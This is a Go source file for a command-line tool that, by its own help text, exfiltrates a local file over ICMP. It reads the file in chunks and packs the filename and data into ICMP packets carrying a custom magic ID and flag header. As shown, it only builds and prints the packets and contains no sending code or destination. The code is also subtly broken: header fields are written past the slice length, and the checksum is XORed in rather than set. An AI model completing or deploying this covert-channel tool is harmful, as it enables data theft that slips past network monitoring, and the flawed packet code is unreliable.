package main

import (
    "fmt"
    "flag"
    "os"
    "log"
    "io"
    "encoding/binary"
)

const BUFFERSIZE = 512
const MAXPAYLOAD = 1472
const MAGIC = 0xA00A
const FIRSTFLAGMASK = 0x01
const LASTFLAGMASK = 0x02
const SIXFLAGMASK = 0x04
const ICMPHEADLENGTH = 8
const IPV4ICMP = 8
const IPV6ICMP = 128

type exfil struct {
    typ uint8
    code uint8
    chksum uint16
    id uint16
    seq uint16
    first bool
    last bool
    six bool
    filename string
    data []byte
}

func initExfil() exfil {
    return exfil{IPV4ICMP, 0, 0, MAGIC, 0, false, false, false, "", nil}
}

func buildFlags(pak exfil) byte {
    var flags byte
    flags = 0

    if pak.first {
        flags |= FIRSTFLAGMASK
    }
    if pak.last {
        flags |= LASTFLAGMASK
    }
    if pak.six {
        flags |= SIXFLAGMASK
    }

    return flags
}

// computes a checksum for byte slice. This is taken from the checksum function
// created for the "icmp" package in message.go
func checksum(b []byte) uint16 {
    csumcv := len(b) - 1 // checksum coverage
    s := uint32(0)
    for i := 0; i < csumcv; i += 2 {
        s += uint32(b[i+1])<<8 | uint32(b[i])
    }
    if csumcv&1 == 0 {
        s += uint32(b[csumcv])
    }
    s = s>>16 + s&0xffff
    s = s + s>>16
    return ^uint16(s)
}

func buildExfilPacket(pak exfil)[]byte {
    offset := 0
    b := make([]byte, 0, len(pak.filename) + len(pak.data) + ICMPHEADLENGTH)
    fmt.Printf("%x\n", b)

    // Building icmp header
    if pak.six {
        pak.typ = IPV6ICMP
    }
    b = append(b, pak.typ, pak.code)
    fmt.Printf("%x\n", b)
    offset += 2
    binary.BigEndian.PutUint16(b[offset:offset+2], pak.chksum)
    fmt.Printf("%x\n", b)
    offset += 2
    binary.BigEndian.PutUint16(b[offset:offset+2], pak.id)
    fmt.Printf("%x\n", b)
    offset += 2
    binary.BigEndian.PutUint16(b[offset:offset+2], pak.seq)
    fmt.Printf("%x\n", b)
    offset += 2

    // flags for exfil header
    flags := buildFlags(pak)
    b = append(b, flags)
    fmt.Printf("%x\n", b)
    offset += 1

    // Special fields for first packet
    if pak.first {
        b = append(b, uint8(len(pak.filename)))
    fmt.Printf("%x\n", b)
        offset += 1
        b = append(b, []byte(pak.filename)...)
    fmt.Printf("%x\n", b)
        offset += len(pak.filename)
    }

    // file data
    var dataLen uint16 = uint16(len(pak.data))
    binary.BigEndian.PutUint16(b[offset:offset+2], dataLen)
    offset += 2
    b = append(b, []byte(pak.data)...)
    fmt.Printf("%x\n", b)

    // re insert checksum
    pak.chksum = checksum(b)
    b[2] ^= byte(pak.chksum)
    b[3] ^= byte(pak.chksum >> 8)
    fmt.Printf("%x\n", b)

    return b
}

func main() {
    var file = flag.String("f", "", "the file to exfiltrate via ICMP")
    var debug = flag.Bool("d", false, "enable debug output")
    var help = flag.Bool("h", false, "show help.")
    var ipv6 = flag.Bool("6", false, "enables the use of IPv6 instead of IPv4")

    flag.Parse()

    if *help || len(os.Args) == 1 {
        flag.PrintDefaults()
        return
    }

    // Open the local file
    f, err := os.Open(*file)
    if err != nil {
        log.Fatalln(err)
    }
    defer f.Close()

    packet := initExfil()
    packet.first = true
    packet.filename = *file
    packet.six = *ipv6

    buf :=make([]byte, BUFFERSIZE)

    var fileError error = nil
    var bytesRead int = 0

    if *debug {
        fmt.Printf("flags bytes: %x\n", buildFlags(packet))
        fmt.Printf("(bytes)filename length: %x\n", len(*file))
        fmt.Printf("file name bytes: %x\n", *file)
    }

    for {
        bytesRead, fileError = f.Read(buf)
        if fileError == io.EOF {
            break
        }
        packet.data = buf[0:bytesRead]
        if *debug {
            fmt.Printf("(bytes)length of data: %x\n", bytesRead)
            fmt.Printf("bytes just read: %x\n", buf[0:bytesRead])
        }
        pak := buildExfilPacket(packet)
        fmt.Printf("%x\n", pak)
    }

    return
}
